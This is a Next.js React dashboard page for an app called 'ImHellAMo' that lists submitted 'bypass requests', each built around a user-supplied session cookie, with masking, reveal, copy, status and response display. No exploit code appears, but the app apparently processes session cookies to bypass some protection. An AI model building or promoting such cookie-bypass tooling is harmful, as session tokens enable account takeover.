'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';
import { ArrowLeft, Plus, Loader2, Eye, EyeOff, Copy, Trash2 } from 'lucide-react';

interface BypassRequest {
  id: string;
  cookie: string;
  status: 'pending' | 'success' | 'failed';
  createdAt: string;
  data?: any;
}

export default function DashboardPage() {
  const [requests, setRequests] = useState<BypassRequest[]>([]);
  const [loading, setLoading] = useState(true);
  const [showCookies, setShowCookies] = useState<Record<string, boolean>>({});
  const [copied, setCopied] = useState<string | null>(null);

  useEffect(() => {
    const fetchRequests = async () => {
      try {
        const res = await fetch('/api/bypass?type=history');
        if (res.ok) {
          const data = await res.json();
          setRequests(data.requests || []);
        }
      } catch (err) {
        console.error('Failed to fetch requests:', err);
      } finally {
        setLoading(false);
      }
    };

    fetchRequests();
    const interval = setInterval(fetchRequests, 5000);

    return () => clearInterval(interval);
  }, []);

  const toggleShowCookie = (id: string) => {
    setShowCookies((prev) => ({
      ...prev,
      [id]: !prev[id],
    }));
  };

  const maskCookie = (cookie: string) => {
    if (cookie.length <= 10) return cookie;
    return cookie.substring(0, 5) + '•'.repeat(Math.max(0, cookie.length - 10)) + cookie.substring(cookie.length - 5);
  };

  const copyToClipboard = async (text: string, id: string) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(id);
      setTimeout(() => setCopied(null), 2000);
    } catch (err) {
      console.error('Failed to copy:', err);
    }
  };

  const getStatusIcon = (status: string) => {
    switch (status) {
      case 'success':
        return '✓';
      case 'failed':
        return '✕';
      default:
        return '◌';
    }
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'success':
        return 'badge-success';
      case 'failed':
        return 'badge-error';
      default:
        return 'badge-warning';
    }
  };

  const stats = {
    total: requests.length,
    success: requests.filter(r => r.status === 'success').length,
    failed: requests.filter(r => r.status === 'failed').length,
    pending: requests.filter(r => r.status === 'pending').length,
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Navigation */}
      <nav className="fixed top-0 w-full z-50 glass-effect border-b backdrop-blur-md">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 flex justify-between items-center">
          <Link href="/" className="text-xl font-bold gradient-text">
            ImHellAMo
          </Link>
          <div className="flex gap-3 items-center">
            <Link href="/submit" className="btn-primary inline-flex items-center gap-2 text-sm">
              <Plus className="w-4 h-4" />
              New Request
            </Link>
            <Link href="/" className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors btn-icon">
              <ArrowLeft className="w-4 h-4" />
            </Link>
          </div>
        </div>
      </nav>

      {/* Main Content */}
      <div className="pt-32 pb-20 px-4">
        <div className="max-w-6xl mx-auto">
          {/* Header */}
          <div className="mb-12">
            <h1 className="text-4xl md:text-5xl font-bold mb-3">Request History</h1>
            <p className="text-muted-foreground text-lg">View and manage all submitted bypass requests</p>
          </div>

          {/* Stats Grid */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
            {[
              { label: 'Total Requests', value: stats.total, color: 'primary' },
              { label: 'Successful', value: stats.success, color: 'success' },
              { label: 'Failed', value: stats.failed, color: 'error' },
              { label: 'Pending', value: stats.pending, color: 'warning' },
            ].map((stat) => (
              <div key={stat.label} className="card-base rounded-lg">
                <div className={`text-3xl font-bold text-${stat.color} mb-1`}>
                  {stat.value}
                </div>
                <div className="text-sm text-muted-foreground">{stat.label}</div>
              </div>
            ))}
          </div>

          {/* Requests List */}
          {loading ? (
            <div className="glass-effect rounded-lg p-12 text-center">
              <Loader2 className="w-8 h-8 animate-spin mx-auto text-primary mb-4" />
              <p className="text-muted-foreground">Loading requests...</p>
            </div>
          ) : requests.length === 0 ? (
            <div className="glass-effect rounded-lg p-12 text-center">
              <p className="text-muted-foreground mb-6">No requests yet. Start by submitting your first cookie.</p>
              <Link href="/submit" className="btn-primary inline-flex items-center gap-2">
                <Plus className="w-4 h-4" />
                Create First Request
              </Link>
            </div>
          ) : (
            <div className="space-y-4">
              {requests.map((request) => (
                <div key={request.id} className="card-base rounded-lg hover:border-primary/50 hover:shadow-card-hover transition-all group">
                  {/* Header Row */}
                  <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-4 mb-4">
                    <div className="flex items-center gap-4">
                      <div className={`badge ${getStatusColor(request.status)}`}>
                        <span>{getStatusIcon(request.status)}</span>
                        <span className="font-medium">{request.status.charAt(0).toUpperCase() + request.status.slice(1)}</span>
                      </div>
                      <time className="text-sm text-muted-foreground">
                        {new Date(request.createdAt).toLocaleString()}
                      </time>
                    </div>
                    <div className="text-xs text-muted-foreground">
                      ID: {request.id.substring(0, 8)}...
                    </div>
                  </div>

                  {/* Cookie Display */}
                  <div className="bg-input/50 rounded-lg p-4 mb-4">
                    <div className="flex items-center justify-between gap-4">
                      <code className="text-sm text-muted-foreground font-mono flex-1 truncate">
                        {showCookies[request.id] ? request.cookie : maskCookie(request.cookie)}
                      </code>
                      <div className="flex gap-2 flex-shrink-0">
                        <button
                          onClick={() => toggleShowCookie(request.id)}
                          className="btn-icon text-muted-foreground hover:text-foreground"
                          title={showCookies[request.id] ? 'Hide' : 'Show'}
                        >
                          {showCookies[request.id] ? (
                            <EyeOff className="w-4 h-4" />
                          ) : (
                            <Eye className="w-4 h-4" />
                          )}
                        </button>
                        <button
                          onClick={() => copyToClipboard(request.cookie, request.id)}
                          className="btn-icon text-muted-foreground hover:text-foreground"
                          title="Copy"
                        >
                          <Copy className="w-4 h-4" />
                        </button>
                      </div>
                    </div>
                    {copied === request.id && (
                      <p className="text-xs text-success mt-2">Copied to clipboard!</p>
                    )}
                  </div>

                  {/* Response Data */}
                  {request.status === 'success' && request.data && (
                    <div className="bg-success/5 border border-success/50 rounded-lg p-4 mb-4">
                      <p className="text-xs text-success font-semibold mb-3">Response Data:</p>
                      <pre className="text-xs text-muted-foreground overflow-x-auto max-h-48 font-mono">
                        {JSON.stringify(request.data, null, 2)}
                      </pre>
                    </div>
                  )}

                  {request.status === 'failed' && request.data && (
                    <div className="bg-error/5 border border-error/50 rounded-lg p-4 mb-4">
                      <p className="text-xs text-error font-semibold mb-2">Error Details:</p>
                      <p className="text-xs text-error">{request.data.error || 'Unknown error'}</p>
                    </div>
                  )}

                  {/* Pending State */}
                  {request.status === 'pending' && (
                    <div className="flex items-center gap-2 text-xs text-warning">
                      <Loader2 className="w-3 h-3 animate-spin" />
                      Processing request...
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
